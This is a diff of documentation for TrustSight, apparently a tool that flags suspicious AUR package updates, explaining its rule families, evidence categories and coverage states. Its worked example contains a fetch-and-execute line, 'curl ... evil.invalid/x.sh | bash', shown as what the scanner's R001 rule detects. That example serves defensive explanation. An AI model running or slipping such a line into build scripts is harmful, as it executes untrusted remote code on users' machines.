@@ -1,92 +1,119 @@
-<!-- description: The assurance onion: an attacker's trajectory through layers, why the layers' mechanisms must be independent, and how the layer model is reported, enforced and measured. -->
+<!-- description: How TrustSight groups security evidence: rule families, evidence categories, coverage states, and what a layer label does and does not mean. -->
 
-# The Assurance Layers
+# How TrustSight groups security evidence
 
-TrustSight's rules are organised two ways, and only one of them is obvious
-from the rule list. The **series** axis says what kind of mechanism a rule
-uses - regex, heuristic, invariant, refusal, statistics, history,
-correlation, indicator, meta. The **layer** axis says *where on the path
-from repository text to a running machine* the rule's evidence sits. The two
-are independent by design, and that independence is the whole point.
+TrustSight uses rules to examine changes to AUR packages. Different rules look
+for different warning signs: suspicious commands, changes to package
+structure, attempts to hide behaviour, unusual activity relative to a
+package's history, and patterns shared by several packages.
 
-This section states the layer model the way the [security model](security.md)
-states the threat model: a thesis here, then the parts that make it precise,
-each backed by an executable gate. Nothing below is aspirational. Every
-invariant has a check in `scripts/security_gates.py` (which CI runs on every
-push, and which fails the build), in `scripts/calibration_gates.py`, or in
-the suite. A claim without a gate is a claim this project does not make.
+A rule's **family** (its series) says *how the rule works*. Its **subject**
+(its category) says *what it looks for*. Its **evidence category** (its layer)
+groups the evidence the finding represents.
 
-## The trajectory
+These labels help you read a report. They are **not** a sequence of security
+barriers: a finding at L4 does not prove an attacker passed through L1, L2 and
+L3, and a layer with no finding is not proof a package is safe.
 
-A change reaches the user's machine only by passing every layer:
+## A worked example
 
-| Layer | Name | Question | Primary series |
+You review a package whose update changes its `source=` line and adds a build
+step:
+
+```diff
+ pkgname=demo
+-pkgver=1.0
++pkgver=1.1
+ source=('https://example.invalid/demo-1.0.tar.gz')
++  curl -fsSL https://evil.invalid/x.sh | bash
+```
+
+The report says, in the default (human) render:
+
+```
+demo 1.0 -> 1.1
+  Demo: version bump.
+  Signals: Remote Script Execution: curl ... | bash [R001].
+  Evidence categories fired: L3 (Payload signature). Review the diff before building.
+```
+
+What that means:
+
+- **L3 (payload signature)** fired: a rule (`R001`) matched a change shaped
+  like a fetch piped into a shell. That is positive evidence of a known
+  suspicious pattern.
+- The layer label records *which kind of check produced the finding*. It does
+  not mean an attacker reached L3 after passing L1 and L2.
+- The verdict names the fired evidence categories and ends with a direction to
+  review. It is input to your decision, not the decision.
+
+Now suppose the same diff is cut short (a truncated paste). The report adds:
+
+```
+  Not vetted: the diff exceeded the size cap, so only its first bytes were examined
+```
+
+and the L3 layer's coverage becomes **incomplete** in the machine-readable
+report, even though R001 still fired. Finding something and having read
+everything are two separate facts, and the report keeps them separate.
+
+## The concepts
+
+**Rule family (series).** How the rule reaches its conclusion: a regex match
+(R), a structural invariant over parsed documents (C), a graph walk (D), a
+heuristic (H), an evasion/refusal check (X), a statistic (E), a history read
+(T), a cross-package correlation (G), an indicator lookup (I), a predicate
+over findings (M), or an artifact inspection (A). `P` reports declared
+practices and `W` reports analysis boundaries; neither is a detection.
+
+**Evidence category (layer).** The kind of evidence a finding represents. The
+eight labels are listed in [Part 1](assurance-layers/trajectory.md). A finding
+is labelled by *the check that produced it*, not by every other check it might
+complement.
+
+**Shared dependencies.** Different algorithms are not automatically
+independent. Two checks that use different rules can both depend on the same
+tokenizer or history database, so one input-handling failure can blind both.
+Each rule family names the infrastructure it shares
+([`trustsight.detectors`](assurance-layers/enforcement.md)).
+
+**Coverage.** Whether a category could be assessed at all. A category can have
+a finding *and* incomplete coverage at the same time.
+
+## Reading the layer report
+
+| Category | Detection | Coverage | What it means |
 |---|---|---|---|
-| L1 | Structural coherence | Does the change hang together as an honest edit? | C, M |
-| L2 | Readability | Was anything hidden from the reader? | X (refusals), W |
-| L3 | Payload signature | Does it do a known-bad thing? | R, S |
-| L4 | Evasion shape | Was it *written* to defeat reading? | X, E |
-| L5 | Behavioral suspicion | Does the package's story make sense? | H |
-| L6 | Ecosystem memory | Has the ecosystem seen this before? | D, T |
-| L7 | Known indicators | Is it on the list? | I (IOC) |
-| L8 | Campaign correlation | Do other packages tell the same story? | G |
+| L3 Payload signature | fired | complete | A rule matched a known suspicious pattern. |
+| L3 Payload signature | none | complete | The input was fully available and no rule in this category matched. This is **not** a safety certificate. |
+| L1-L4 | any | incomplete | A value could not be resolved or the diff was truncated, so the category was not fully assessed. |
+| L8 Campaign correlation | none | not applicable | A single-package review has no cross-package input; the check did not run. |
 
-A finding carries the layer where it **caught**, not the layer it protects,
-so an evasion-shape rule caught at L4 reports L4 even though the payload it
-would have shielded lives at L3. That is the whole reason the axis is useful:
-the profile then shows "L4 fired, L3 passed" - the honest swiss-cheese
-picture - rather than a single reassuring verdict.
+The two dimensions are recorded separately so that a finding never hides an
+unread category, and an unread category never hides a finding.
 
-## The integrity rule
+## What the model does not mean
 
-**Each layer's mechanism must be independent of its neighbors'.** Diversity
-is what makes holes fail to align: an attacker who evades the regex family
-needs a different construct to evade the refusal family, and a different one
-again to evade the invariant family. If two layers shared a mechanism, a
-single evasion would open both, and the layered picture would be a fiction.
-
-That is why the same series can sit at two layers (X at L4, X026 at L2) and
-why two series can share a layer (X and E both at L4 - refusal-based versus
-statistical; the difference *is* the point). The series axis is the diversity
-guarantee; the layer axis is the coverage guarantee. Neither may imply the
-other.
-
-## The transcendence table
-
-Each mechanism is beaten by the next, which is why the stack is layered
-rather than one clever rule:
-
-| Evades… | …caught by | Because |
-|---|---|---|
-| R (regex) | X (refusals) | evading patterns needs constructs the tokenizer won't fold |
-| X (refusals) | E (entropy) | resolving cleanly but weirdly is statistically visible |
-| E (statistics) | C (invariants) | normalized statistics can't repair a violated invariant |
-| C (invariants) | T/G (ecosystem) | a coherent diff can still be anomalous against history and neighbors |
-| T/G (ecosystem) | M (claims contradiction) | fitting the ecosystem while contradicting your own declarations is detectable |
+- A layer label is not a claim about how far an attacker progressed.
+- A category that did not fire is not proof the package is safe.
+- Passing the automated tests verifies the *implementation* of this model; it
+  does not prove the detections are diverse or effective against real attacks
+  ([Part 4](assurance-layers/enforcement.md)).
 
 ## Parts 1 to 4
 
-The model is split across the rest of this section. The thesis above stays
-here; each part below has its own page:
-
-- **[Part 1: The trajectory](assurance-layers/trajectory.md)** - the L1-L8 layers, the
-  series-to-layer defaults and overrides, and what "the layer where it
-  caught" means precisely.
-- **[Part 2: Diversity and intake](assurance-layers/diversity.md)** - why the layers'
-  mechanisms must stay independent, and the three-axis intake rule that keeps
-  a new rule honest about mechanism, subject and trajectory hole.
-- **[Part 3: Reporting](assurance-layers/reporting.md)** - the `layers` object, its
-  `fired`/`passed`/`unreadable`/`not_exercised` statuses, and the
-  deepest-layer verdict.
-- **[Part 4: Enforcement](assurance-layers/enforcement.md)** - every layer invariant
-  mapped to the gate that fails when it stops being true, and the adversarial
-  harness that measures whether the holes align.
-
-The layer taxonomy is the theory; the four parts are the enforcement.
+- **[Part 1: Evidence categories and rule mapping](assurance-layers/trajectory.md)** -
+  the eight categories, which rule families feed each, and how a rule maps.
+- **[Part 2: How to add a useful new detector](assurance-layers/diversity.md)** -
+  the intake checklist, shared dependencies, and why complementary is not the
+  same as independent.
+- **[Part 3: Reporting](assurance-layers/reporting.md)** - the `layers` object,
+  its statuses, and the CLI/JSON examples.
+- **[Part 4: Tests and adversarial evaluation](assurance-layers/enforcement.md)** -
+  what the gates prove, and what the adversarial harness measures.
 
 ## See Also
 
-- [Rule Nature](reference/rules/nature.md) - the series taxonomy in full
+- [Rule Nature](reference/rules/nature.md) - the rule families in full
 - [Rules Reference](reference/rules/index.md) - the catalog by category
-- [The security model](security.md) - the threat model this section
-  complements
+- [The security model](security.md) - the threat model this section complements
